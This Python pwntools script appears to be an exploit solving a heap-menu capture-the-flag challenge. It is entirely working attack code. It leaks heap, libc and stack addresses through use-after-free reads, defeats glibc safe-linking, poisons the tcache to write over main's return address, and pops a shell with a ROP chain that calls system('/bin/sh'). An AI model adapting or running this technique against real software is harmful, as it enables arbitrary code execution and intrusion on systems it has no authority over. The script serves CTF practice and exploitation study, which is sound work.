from pwn import *
context.arch = "amd64"

#p = process("./main_patched")
p = remote("0.0.0.0", 1338)
elf = ELF("./main_patched", checksec = False)
#libc = elf.libc
libc = ELF("./libc.so.6", checksec = 0)
s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sla = lambda a, b: p.sendlineafter(a, b)
sl = lambda a: p.sendline(a)
ru = lambda a: p.recvuntil(a)

rdi = 0x00000000000240e5

def alpha(heap, target):
    return target ^ (heap >> 0xc)

def decrypt(cipher):
    key = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain

def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def cmd(choice): sla(b"Choice >> ", str(choice))

def add(size, content) :
    cmd(1)
    sla(b"Size : ", str(size))
    sa(b"Content: ", content)

def delete(idx):
    cmd(2)
    sla(b"Index: ", str(idx))

def edit(idx, content):
    cmd(3)
    sla(b"Index: ", str(idx))
    sa(b"Content: ", content)

def show(idx):
    cmd(4)
    sla(b"Index: ", str(idx))

if __name__ == "__main__":
    for i in range(20):
        add(0x80, b"retr0")
    for i in range(13, 20):
        delete(i)
    delete(12)
    show(15)
    ru(b"Content: ")
    heap_leak = u64(p.recv(6).ljust(8, b"\x00"))
    heap_leak = decrypt(heap_leak) - 0xca0
    show(12)
    ru(b"Content: ")
    libc.address = u64(p.recv(6).ljust(8, b"\x00")) - 0x1f6ce0 #- libc.sym.main_arena - 96
    log.info("heap @ " + hex(heap_leak))
    log.info("libc @ " + hex(libc.address))
    edit(19, p64(alpha(heap_leak, libc.sym.environ - 0x10)))
    add(0x80, b"retr0")
    add(0x80, b"A" * 0x10)
    show(21)
    ru(b"A" * 0x10)
    stack_leak = u64(p.recv(6).ljust(8, b"\x00"))
    log.info("stack @ " + hex(stack_leak))
    log.info("main saved ret addr @ " + hex(stack_leak - 0x140))
    for i in range(3):
        add(0x40, b"retr0")
    for i in range(22, 24):
        delete(i)
    edit(23, p64(alpha(heap_leak ,stack_leak - 0x148 + 1)))
    add(0x40, b"retr0")
    #gdb.attach(p)
    add(0x40, p64(0) + p64(libc.address + rdi) + p64(next(libc.search(b"/bin/sh\x00"))) + p64(rdi + libc.address + 1) + p64(libc.sym.system))
    p.interactive()
